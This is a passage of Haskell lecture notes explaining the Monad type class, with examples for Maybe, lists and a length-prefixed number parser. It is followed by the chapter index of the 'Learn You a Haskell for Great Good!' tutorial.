However, suppose we are trying to parse a file containing a sequence
of numbers, like this:

    4 78 19 3 44 3 1 7 5 2 3 2

The catch is that the first number in the file tells us the length of
a following "group" of numbers; the next number after the group is the
length of the next group, and so on.  So the example above could be
broken up into groups like this:

    78 19 3 44   -- first group
    1 7 5        -- second group
    3 2          -- third group

This is a somewhat contrived example, but in fact there are many
"real-world" file formats that follow a similar principle---you read
some sort of header which then tells you the lengths of some following
blocks, or where to find things in the file, and so on.

We would like to write a parser for this file format of type

~~~~ {.haskell}
parseFile :: Parser [[Int]]
~~~~

Unfortunately, this is not possible using only the `Applicative`
interface.  The problem is that `Applicative` gives us no way to
decide what to do next based on previous results: we must decide in
advance what parsing operations we are going to run, before we see the
results.

It turns out, however, that the `Parser` type *can* support this sort
of pattern, which is abstracted into the `Monad` type class.

Monad
-----

The `Monad` type class is defined as follows: 

~~~~ {.haskell}
class Monad m where
  return :: a -> m a

  (>>=) :: m a -> (a -> m b) -> m b

  (>>)  :: m a -> m b -> m b
  m1 >> m2 = m1 >>= \_ -> m2
~~~~

This should look familiar!  We have seen these methods before in the
context of `IO`, but in fact they are not specific to `IO` at all.
It's just that a monadic interface to `IO` has proved useful.

`return` also looks familiar because it has the same type as `pure`.
In fact, every `Monad` should also be an `Applicative`, with `pure =
return`.  The reason we have both is that `Applicative` was invented
*after* `Monad` had already been around for a while.

`(>>)` is just a specialized version of `(>>=)` (it is included in
the `Monad` class in case some instance wants to provide a more
efficient implementation, but usually the default implementation
is just fine).  So to understand it we first need to understand `(>>=)`.

There is actually a fourth method called `fail`, but putting it in the
`Monad` class was a mistake, and you should never use it, so I won't
tell you about it (you can
[read about it in the Typeclassopedia](http://www.haskell.org/haskellwiki/Typeclassopedia#do_notation)
if you are interested).

`(>>=)` (pronounced "bind") is where all the action is!  Let's think
carefully about its type:

    (>>=) :: m a -> (a -> m b) -> m b

`(>>=)` takes two arguments.  The first one is a value of type `m a`.
(Incidentally, such values are sometimes called *monadic values*, or
*computations*.  It has also been proposed to call them *mobits*.  The
one thing you must *not* call them is "monads", since that is a kind
error: the type constructor `m` is a monad.) In any case, the idea is
that a mobit of type `m a` represents a computation which results in a
value (or several values, or no values) of type `a`, and may also have
some sort of "effect":

  * `c1 :: Maybe a` is a computation which might fail but results in an `a` if
    it succeeds.

  * `c2 :: [a]` is a computation which results in (multiple) `a`s.

  * `c3 :: Parser a` is a computation which implicitly consumes part
    of a `String` and (possibly) produces an `a`.

  * `c4 :: IO a` is a computation which potentially has some I/O effects and
    then produces an `a`.

And so on.  Now, what about the second argument to `(>>=)`?  It is a
*function* of type `(a -> m b)`.  That is, it is a function which will
*choose* the next computation to run based on the result(s) of the
first computation.  This is precisely what embodies the promised power
of `Monad` to encapsulate computations which can choose what to do
next based on the results of previous computations.

So all `(>>=)` really does is put together two mobits to produce a
larger one, which first runs one and then the other, returning the
result of the second one.  The all-important twist is that we get to
decide which mobit to run second based on the output from the first.

The default implementation of `(>>)` should make sense now:

    (>>)  :: m a -> m b -> m b
    m1 >> m2 = m1 >>= \_ -> m2

`m1 >> m2` simply does `m1` and then `m2`, ignoring the result of
`m1`.

Examples
--------

Let's start by writing a `Monad` instance for `Maybe`: 

~~~~ {.haskell}
instance Monad Maybe where
  return  = Just
  Nothing >>= _ = Nothing
  Just x  >>= k = k x
~~~~

`return`, of course, is `Just`.  If the first argument of `(>>=)` is
`Nothing`, then the whole computation fails; otherwise, if it is `Just
x`, we apply the second argument to `x` to decide what to do next.

Incidentally, it is common to use the letter `k` for the second
argument of `(>>=)` because `k` stands for "continuation".  I wish I
was joking.

Some examples:

> check :: Int -> Maybe Int
> check n | n < 10    = Just n
>         | otherwise = Nothing
>
> halve :: Int -> Maybe Int
> halve n | even n    = Just $ n `div` 2
>         | otherwise = Nothing
>
> exM1 = return 7 >>= check >>= halve
> exM2 = return 12 >>= check >>= halve
> exM3 = return 12 >>= halve >>= check

How about a `Monad` instance for the list constructor `[]`?

~~~~ {.haskell}
instance Monad [] where
  return x = [x]
  xs >>= k = concat (map k xs)
~~~~

A simple example:

> addOneOrTwo :: Int -> [Int]
> addOneOrTwo x = [x+1, x+2]
>
> exL1 = [10,20,30] >>= addOneOrTwo

Monad combinators
-----------------

One nice thing about the `Monad` class is that using only `return` and
`(>>=)` we can build up a lot of nice general combinators for
programming with monads. Let's look at a couple.

First, `sequence` takes a list of monadic values and produces a single
monadic value which collects the results.  What this means depends on
the particular monad.  For example, in the case of `Maybe` it means
that the entire computation succeeds only if all the individual ones
do; in the case of `IO` it means to run all the computations in
sequence; in the case of `Parser` it means to run all the parsers on
sequential parts of the input (and succeed only if they all do).

~~~~ {.haskell}
sequence :: Monad m => [m a] -> m [a]
sequence [] = return []
sequence (ma:mas) =
  ma >>= \a ->
  sequence mas >>= \as ->
  return (a:as)
~~~~

Using `sequence` we can also write other combinators, such as

~~~~ {.haskell}
replicateM :: Monad m => Int -> m a -> m [a]
replicateM n m = sequence (replicate n m)
~~~~

And now we are finally in a position to write the parser we wanted to
write: it is simply

~~~~ {.haskell}
parseFile :: Parser [[Int]]
parseFile = many parseLine
parseLine :: Parser [Int]
parseLine = parseInt >>= \i -> replicateM i parseInt
~~~~

(`many` was also known as `zeroOrMore` on the homework).

 <!--

Local Variables: 
mode:markdown
compile-command:"make explec"
End:

-->






=====================================
/Learn You a Haskell for Great Good!
=====================================


.. rubric:: Learn You a Haskell for Great Good!
   :name: learn-you-a-haskell-for-great-good

#. `Introduction <http://learnyouahaskell.com/introduction>`__

   -  `About this tutorial <http://learnyouahaskell.com/introduction#about-this-tutorial>`__
   -  `So what's Haskell? <http://learnyouahaskell.com/introduction#so-whats-haskell>`__
   -  `What you need to dive in <http://learnyouahaskell.com/introduction#what-you-need>`__

#. `Starting Out <http://learnyouahaskell.com/starting-out>`__

   -  `Ready, set, go! <http://learnyouahaskell.com/starting-out#ready-set-go>`__
   -  `Baby's first functions <http://learnyouahaskell.com/starting-out#babys-first-functions>`__
   -  `An intro to lists <http://learnyouahaskell.com/starting-out#an-intro-to-lists>`__
   -  `Texas ranges <http://learnyouahaskell.com/starting-out#texas-ranges>`__
   -  `I'm a list comprehension <http://learnyouahaskell.com/starting-out#im-a-list-comprehension>`__
   -  `Tuples <http://learnyouahaskell.com/starting-out#tuples>`__

#. `Types and Typeclasses <http://learnyouahaskell.com/types-and-typeclasses>`__

   -  `Believe the type <http://learnyouahaskell.com/types-and-typeclasses#believe-the-type>`__
   -  `Type variables <http://learnyouahaskell.com/types-and-typeclasses#type-variables>`__
   -  `Typeclasses 101 <http://learnyouahaskell.com/types-and-typeclasses#typeclasses-101>`__

#. `Syntax in Functions <http://learnyouahaskell.com/syntax-in-functions>`__

   -  `Pattern matching <http://learnyouahaskell.com/syntax-in-functions#pattern-matching>`__
   -  `Guards, guards! <http://learnyouahaskell.com/syntax-in-functions#guards-guards>`__
   -  `Where!? <http://learnyouahaskell.com/syntax-in-functions#where>`__ -  `Let it be <http://learnyouahaskell.com/syntax-in-functions#let-it-be>`__
   -  `Case expressions <http://learnyouahaskell.com/syntax-in-functions#case-expressions>`__

#. `Recursion <http://learnyouahaskell.com/recursion>`__

   -  `Hello recursion! <http://learnyouahaskell.com/recursion#hello-recursion>`__
   -  `Maximum awesome <http://learnyouahaskell.com/recursion#maximum-awesome>`__
   -  `A few more recursive functions <http://learnyouahaskell.com/recursion#a-few-more-recursive-functions>`__
   -  `Quick, sort! <http://learnyouahaskell.com/recursion#quick-sort>`__
   -  `Thinking recursively <http://learnyouahaskell.com/recursion#thinking-recursively>`__

#. `Higher Order Functions <http://learnyouahaskell.com/higher-order-functions>`__

   -  `Curried functions <http://learnyouahaskell.com/higher-order-functions#curried-functions>`__
   -  `Some higher-orderism is in order <http://learnyouahaskell.com/higher-order-functions#higher-orderism>`__
   -  `Maps and filters <http://learnyouahaskell.com/higher-order-functions#maps-and-filters>`__
   -  `Lambdas <http://learnyouahaskell.com/higher-order-functions#lambdas>`__
   -  `Only folds and horses <http://learnyouahaskell.com/higher-order-functions#folds>`__
   -  `Function application with $ <http://learnyouahaskell.com/higher-order-functions#function-application>`__
   -  `Function composition <http://learnyouahaskell.com/higher-order-functions#composition>`__

#. `Modules <http://learnyouahaskell.com/modules>`__

   -  `Loading modules <http://learnyouahaskell.com/modules#loading-modules>`__
   -  `Data.List <http://learnyouahaskell.com/modules#data-list>`__
   -  `Data.Char <http://learnyouahaskell.com/modules#data-char>`__
   -  `Data.Map <http://learnyouahaskell.com/modules#data-map>`__
   -  `Data.Set <http://learnyouahaskell.com/modules#data-set>`__
   -  `Making our own modules <http://learnyouahaskell.com/modules#making-our-own-modules>`__

#. `Making Our Own Types and Typeclasses <http://learnyouahaskell.com/making-our-own-types-and-typeclasses>`__

   -  `Algebraic data types intro <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#algebraic-data-types>`__
   -  `Record syntax <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#record-syntax>`__
   -  `Type parameters <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#type-parameters>`__
   -  `Derived instances <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#derived-instances>`__
   -  `Type synonyms <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#type-synonyms>`__
   -  `Recursive data structures <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#recursive-data-structures>`__
   -  `Typeclasses 102 <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#typeclasses-102>`__
   -  `A yes-no typeclass <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#a-yes-no-typeclass>`__
   -  `The Functor typeclass <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#the-functor-typeclass>`__
   -  `Kinds and some type-foo <http://learnyouahaskell.com/making-our-own-types-and-typeclasses#kinds-and-some-type-foo>`__

#. `Input and Output <http://learnyouahaskell.com/input-and-output>`__

   -  `Hello, world! <http://learnyouahaskell.com/input-and-output#hello-world>`__
   -  `Files and streams <http://learnyouahaskell.com/input-and-output#files-and-streams>`__
   -  `Command line arguments <http://learnyouahaskell.com/input-and-output#command-line-arguments>`__
   -  `Randomness <http://learnyouahaskell.com/input-and-output#randomness>`__
   -  `Bytestrings <http://learnyouahaskell.com/input-and-output#bytestrings>`__
   -  `Exceptions <http://learnyouahaskell.com/input-and-output#exceptions>`__

#. `Functionally Solving Problems <http://learnyouahaskell.com/functionally-solving-problems>`__

   -  `Reverse Polish notation calculator <http://learnyouahaskell.com/functionally-solving-problems#reverse-polish-notation-calculator>`__
   -  `Heathrow to London <http://learnyouahaskell.com/functionally-solving-problems#heathrow-to-london>`__

#. `Functors, Applicative Functors and Monoids <http://learnyouahaskell.com/functors-applicative-functors-and-monoids>`__

   -  `Functors redux <http://learnyouahaskell.com/functors-applicative-functors-and-monoids#functors-redux>`__
   -  `Applicative functors <http://learnyouahaskell.com/functors-applicative-functors-and-monoids#applicative-functors>`__
   -  `The newtype keyword <http://learnyouahaskell.com/functors-applicative-functors-and-monoids#the-newtype-keyword>`__
   -  `Monoids <http://learnyouahaskell.com/functors-applicative-functors-and-monoids#monoids>`__
#. `A Fistful of Monads <http://learnyouahaskell.com/a-fistful-of-monads>`__

   -  `Getting our feet wet with Maybe <http://learnyouahaskell.com/a-fistful-of-monads#getting-our-feet-wet-with-maybe>`__
   -  `The Monad type class <http://learnyouahaskell.com/a-fistful-of-monads#the-monad-type-class>`__
   -  `Walk the line <http://learnyouahaskell.com/a-fistful-of-monads#walk-the-line>`__
   -  `do notation <http://learnyouahaskell.com/a-fistful-of-monads#do-notation>`__
   -  `The list monad <http://learnyouahaskell.com/a-fistful-of-monads#the-list-monad>`__
   -  `Monad laws <http://learnyouahaskell.com/a-fistful-of-monads#monad-laws>`__

#. `For a Few Monads More <http://learnyouahaskell.com/for-a-few-monads-more>`__

   -  `Writer? I hardly know her! <http://learnyouahaskell.com/for-a-few-monads-more#writer>`__
   -  `Reader? Ugh, not this joke again. <http://learnyouahaskell.com/for-a-few-monads-more#reader>`__
   -  `Tasteful stateful computations <http://learnyouahaskell.com/for-a-few-monads-more#state>`__
   -  `Error error on the wall <http://learnyouahaskell.com/for-a-few-monads-more#error>`__
   -  `Some useful monadic functions <http://learnyouahaskell.com/for-a-few-monads-more#useful-monadic-functions>`__
   -  `Making monads <http://learnyouahaskell.com/for-a-few-monads-more#making-monads>`__

#. `Zippers <http://learnyouahaskell.com/zippers>`__

   -  `Taking a walk <http://learnyouahaskell.com/zippers#taking-a-walk>`__
   -  `A trail of breadcrumbs <http://learnyouahaskell.com/zippers#a-trail-of-breadcrumbs>`__
   -  `Focusing on lists <http://learnyouahaskell.com/zippers#focusing-on-lists>`__
   -  `A very simple file system <http://learnyouahaskell.com/zippers#a-very-simple-file-system>`__
   -  `Watch your step <http://learnyouahaskell.com/zippers#watch-your-step>`__

This work is licensed under a 
`Creative Commons Attribution-Noncommercial-Share Alike 3.0 Unported License <http://creativecommons.org/licenses/by-nc-sa/3.0/>`__
because I couldn't find a license with an even longer name.



